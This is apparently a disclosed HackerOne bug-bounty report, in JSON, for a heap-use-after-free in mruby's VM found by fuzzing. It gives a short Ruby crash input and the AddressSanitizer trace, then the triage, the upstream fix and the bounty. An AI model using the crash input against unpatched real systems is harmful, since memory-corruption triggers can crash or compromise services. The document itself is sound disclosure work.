{"id":222294,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjIyOTQ=","url":"https://hackerone.com/reports/222294","title":"heap-use-after-free in mrb_vm_exec - vm.c:1247","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-04-19T22:17:20.987Z","submitted_at":"2017-04-19T22:17:20.987Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ilsani","url":"/ilsani","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/034/984/3b77bc02e946405c4f4f77b7b678907d81f1946c_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-21T14:03:23.319Z","bug_reporter_agreed_on_going_public_at":"2017-04-21T14:03:22.428Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Following input causes a heap-use-after-free in `mrb_vm_exec` (vm.c:1247):\n```\ng=0.times.p{}\na %w{0 0 0 0 0 0 0 0 0 0\n0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0\n0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 { 0 } 0 0 0 0 0 0 0 0 0\n0 0 0\n0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 } 0}.(\u0026:e)\n```\n```\n==3480==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e0c0 at pc 0x0000004385b1 bp 0x7ffd93156930 sp 0x7ffd9315692\n8                                                                \nWRITE of size 8 at 0x61d00001e0c0 thread T0                         \n    #0 0x4385b0 in mrb_vm_exec /tmp/mruby/src/vm.c:1247\n    #1 0x4407f9 in mrb_vm_run /tmp/mruby/src/vm.c:854\n    #2 0x4407f9 in mrb_top_run /tmp/mruby/src/vm.c:2705\n    #3 0x58652d in mrb_load_exec /tmp/mruby/mrbgems/mruby-compiler/core/parse.y:\n5780                         \n    #4 0x403bbe in main /tmp/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:2\n47                           \n    #5 0x7f52c49752b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)\n    #6 0x402e19 in _start (/home/debian/work/fuzz/mruby/fuzz/20170419/mruby+0x402e19)\n                             \n0x61d00001e0c0 is located 64 bytes inside of 2048-byte region [0x61d00001e080,0x61d00001e880)\nfreed by thread T0 here:     \n    #0 0x7f52c5753090 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.3+0xc2090)\n    #1 0x4d3ee0 in mrb_realloc_simple /tmp/mruby/src/gc.c:202\n    #2 0x4d3ee0 in mrb_realloc /tmp/mruby/src/gc.c:216\n                             \npreviously allocated by thread T0 here:\n    #0 0x7f52c5753090 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.3+0xc2090)\n    #1 0x4d3ee0 in mrb_realloc_simple /tmp/mruby/src/gc.c:202\n    #2 0x4d3ee0 in mrb_realloc /tmp/mruby/src/gc.c:216\n\nSUMMARY: AddressSanitizer: heap-use-after-free /tmp//mruby/src/vm.c:1247 in mrb_vm_exec\n```","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-05-21T14:03:22.465Z","allow_singular_disclosure_after":-138585850.5378913,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","grampae","spetr0x"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1622303,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to two weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-04-19T22:17:21.176Z","updated_at":"2017-04-19T22:17:21.176Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1622324,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Thank you for your report.\n\nWhat version of MRuby (i.e. git SHA) did you test with? I can't reproduce the crash on the latest master (6a0b68f8b81adff8bc9fa58764eb014fa30de1c5).","automated_response":false,"created_at":"2017-04-19T22:20:12.368Z","updated_at":"2017-04-19T22:20:12.368Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1622355,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"The version looks the same. I attached the testcase that I used.\n\nTest platform:\nLinux 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u1 (2017-02-22) x86_64 GNU/Linux\n\nGIT SHA:\n6a0b68f8b81adff8bc9fa58764eb014fa30de1c5\n","automated_response":false,"created_at":"2017-04-19T22:30:12.992Z","updated_at":"2017-04-19T22:30:12.992Z","actor":{"username":"ilsani","cleared":false,"url":"/ilsani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/984/3b77bc02e946405c4f4f77b7b678907d81f1946c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":177343,"filename":"testcase.rb","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/177/343/9af93bce76934cc5dc3199cefb120483e8525908/testcase.rb?response-content-disposition=attachment%3B%20filename%3D%22testcase.rb%22%3B%20filename%2A%3DUTF-8%27%27testcase.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTTPJWCNM%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140733Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDOwM9%2B2Ol25EbTHv2AOl1ZXwoFCdY81Kf4Cj%2BZw5bGagIhALNw4OtUKzuuJ5JDnXIMoizsmzLoA6B3TMlT4JOm5OV%2FKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBja9Y5H4vqpYK%2BZIq1wMKEFztYF934tg2oiDnz06aS%2BIxaoyblb3k6%2F%2BxBMgQzBtDrU0ocKh0rsBsPTyultSX957Ztb0Xxm%2BlSHqRsjq6d7mkuWsgkJaqQC34P%2FPoowX%2BlH2ZrTK%2FmkJH0GzYvbYPapiuIgj7k6s%2BThAEuj5K1dIvpyoPZSWU4lDCKAHDR63JJK4rjQBzSsyouhVced%2BThWTOJVdRFvPpVLh85ANN2kni9b%2BvA%2BYr4QNdI7bXX3vCy%2Bmlxmt9OtrkNSzeMBq%2B4UjjQL%2BALBrQRVk2zZ5rDj%2ByazHJ4N56LN4FxJEAdf%2BKr7nn9dZ2DExdIbY7%2Blz79tlyq02tT%2B98LGY82aPEMuTJbBZN6Znugvuj3qTN5Ajkz33XEdb09pTvqYEHwNQvHa8molgvM8Hr0UftpVOr%2FcSDQ%2Be7ClWky3g9k3C7fx8DtVeV3YKXMiauv6oe6iv529tf7ZQLwVbk8MDZHKluj8DVRfRr7MlmTLozZouf9SJ7q02NxX1M1zjSiK9%2Bb3knUL5CRpQRCENhmDWhXpTY5NtCVb6swQ3By1ka7LxXtkUadmYfSCwXxpca0jIGluHz9THdy%2Fc3993usF1hP11r0y8u18g%2BZLF5OCf8pMK8LDv4nKUjODow6e2QiwY6pAHH%2FNyAbORzwpluWJFiLzeFhl5RjYZpJEx0nM7ZKbFuGASfNSFcAHpRW7ZXX%2BBSHdPdxqv%2BQd1FC1QHUbL0ZWNROontBy0xjQujOuLkMDUyDfIqsPUVcZohJWSYUkM5yYj9wg6BrbGLNW9NinBFdcPB5%2BIeF%2Bg7o5tKzk0UaPV%2FO3FiQPt3VlESRyrk8YbEQk7JEub211414ZV4sdV3jLFmf60bgw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=50d1faa9f27d68ca2a4bd1d7df6004b6723d5cb609e538c7094192bf6fb92666"}],"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1622367,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, I reproduced it using the attached version.","automated_response":false,"created_at":"2017-04-19T22:34:22.932Z","updated_at":"2017-04-19T22:34:22.932Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1622375,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok. Thanks for the feedback.","automated_response":false,"created_at":"2017-04-19T22:36:36.677Z","updated_at":"2017-04-19T22:36:36.677Z","actor":{"username":"ilsani","cleared":false,"url":"/ilsani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/984/3b77bc02e946405c4f4f77b7b678907d81f1946c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1622391,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. I've opened an issue upstream: https://github.com/mruby/mruby/issues/3622","automated_response":false,"created_at":"2017-04-19T22:43:45.686Z","updated_at":"2017-04-19T22:43:45.686Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1626318,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue was resolved upstream in https://github.com/mruby/mruby/commit/94bcdca64fb08e3724c1a5cf6ce25f6f9c6e041e.\n\nOur next round of bounty decisions will take place in approximately one week, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-04-21T14:01:05.534Z","updated_at":"2017-04-21T14:01:05.534Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ilsani","url":"/ilsani"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1626326,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the feedback.","automated_response":false,"created_at":"2017-04-21T14:03:11.144Z","updated_at":"2017-04-21T14:03:11.144Z","actor":{"username":"ilsani","cleared":false,"url":"/ilsani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/984/3b77bc02e946405c4f4f77b7b678907d81f1946c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1626327,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-04-21T14:03:22.442Z","updated_at":"2017-04-21T14:03:22.442Z","first_to_agree":true,"actor":{"username":"ilsani","cleared":false,"url":"/ilsani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/984/3b77bc02e946405c4f4f77b7b678907d81f1946c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1650263,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify!","automated_response":false,"created_at":"2017-05-02T22:03:00.659Z","updated_at":"2017-05-02T22:03:00.659Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"ilsani","url":"/ilsani"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1650275,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty!","automated_response":false,"created_at":"2017-05-02T22:05:32.363Z","updated_at":"2017-05-02T22:05:32.363Z","actor":{"username":"ilsani","cleared":false,"url":"/ilsani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/984/3b77bc02e946405c4f4f77b7b678907d81f1946c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1689826,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-05-21T14:03:23.337Z","updated_at":"2017-05-21T14:03:23.337Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}